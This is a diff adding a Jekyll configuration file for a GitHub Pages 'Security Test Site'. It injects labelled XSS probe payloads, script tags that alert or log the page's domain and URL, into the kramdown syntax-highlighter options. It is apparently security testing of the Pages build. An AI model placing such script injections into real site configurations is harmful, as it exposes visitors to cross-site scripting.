@@ -1,0 +1,46 @@
+# GitHub Pages Configuration
+title: "Security Test Site"
+description: "Testing GitHub Pages Security"
+
+# Theme configuration
+theme: jekyll-theme-minimal
+
+# Markdown processing
+markdown: kramdown
+kramdown:
+  syntax_highlighter: rouge
+  syntax_highlighter_opts:
+    block:
+      # XSS Test Payload
+      line_numbers: '<script>alert("Domain: " + document.domain + "\nURL: " + window.location.href)</script>'
+      
+    span:
+      # Additional XSS Test
+      class: '<script>console.log("Page Info:", {
+        "url": window.location.href,
+        "domain": document.domain,
+        "path": window.location.pathname
+      })</script>'
+
+# Basic settings
+url: ""
+baseurl: ""
+
+# Include settings
+include:
+  - README.md
+  - _layouts
+  - assets
+
+# Plugin settings
+plugins:
+  - jekyll-coffeescript
+  - jekyll-commonmark-ghpages
+  - jekyll-gist
+  - jekyll-github-metadata
+  - jekyll-paginate
+  - jekyll-relative-links
+  - jekyll-optional-front-matter
+  - jekyll-readme-index
+  - jekyll-default-layout
+  - jekyll-titles-from-headings
